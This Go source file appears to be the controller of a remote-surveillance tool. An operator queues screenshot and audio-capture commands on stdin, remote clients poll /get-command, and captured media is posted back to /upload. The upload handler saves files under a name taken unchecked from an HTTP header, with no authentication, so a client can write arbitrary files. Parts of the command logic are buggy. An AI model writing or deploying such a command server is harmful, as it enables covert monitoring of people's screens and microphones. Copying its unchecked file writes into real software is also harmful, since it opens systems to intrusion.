package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
)

// Global commands so user input can be handeled

var mutex sync.Mutex
var userInput string = ""

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	// 1. Get the custom instruction from the HTTP header
	mediaType := r.Header.Get("X-Media-Type")
	fileName := r.Header.Get("X-File-Name")
	fmt.Printf("Receiving a %s file named: %s...\n", mediaType, fileName)

	// 2. Create the blank local file on disk
	dst, err := os.Create(fileName)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	// 3. Stream the bytes directly from the network connection to the disk.
	_, err = io.Copy(dst, r.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	fmt.Fprint(w, "File received successfully!")
}

func commandHandler(w http.ResponseWriter, r *http.Request) {
	mutex.Lock()
	/*if userInput == "" || userInput == "idle" {
		fmt.Fprint(w, "idle")
	}
	if userInput == "ss" {
		fmt.Fprint(w, "screenshot")
		userInput = ""
		fmt.Println("sending screenshot command")
	}
	if userInput == "sound" {
		fmt.Fprint(w, "audio")
		userInput = ""
		fmt.Println("sending audio command")
	}
	*/
	command := strings.Fields(userInput)
	if len(command) == 0 {
		fmt.Fprint(w, "idle")
		mutex.Unlock()
		return
	}

	switch command[0] {
	case "idle":
		fmt.Fprint(w, userInput)

	case "ss":
		if len(command) < 2 {
			fmt.Println("Invalid usage", userInput)
		}

		fmt.Fprint(w, userInput)
		userInput = ""
		fmt.Println("sending screenshot command")

	case "sound":
		if len(command) < 2 {
			fmt.Println("Invalid usage", userInput)
			fmt.Println("Hint try sound ./(yourpath)")
			userInput = "idle"
			break
		} else {
			fmt.Fprint(w, userInput)
			command = nil
			fmt.Println("sending audio command")
		}

	default:
		fmt.Fprint(w, "idle")
	}

	defer mutex.Unlock()
}

func reveiveInput() {
	scanner := bufio.NewScanner(os.Stdin)

	for scanner.Scan() {
		mutex.Lock()
		userInput = scanner.Text()
		mutex.Unlock()
		fmt.Println("Queued command:", userInput)
	}

	// Check for errors
	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "reading standard input:", err)
	}
}

func main() {
	http.HandleFunc("/upload", uploadHandler)
	http.HandleFunc("/get-command", commandHandler)

	go reveiveInput()
	fmt.Println("Receiver running on port 10000. Waiting for media...")
	panic(http.ListenAndServe(":10000", nil))

}
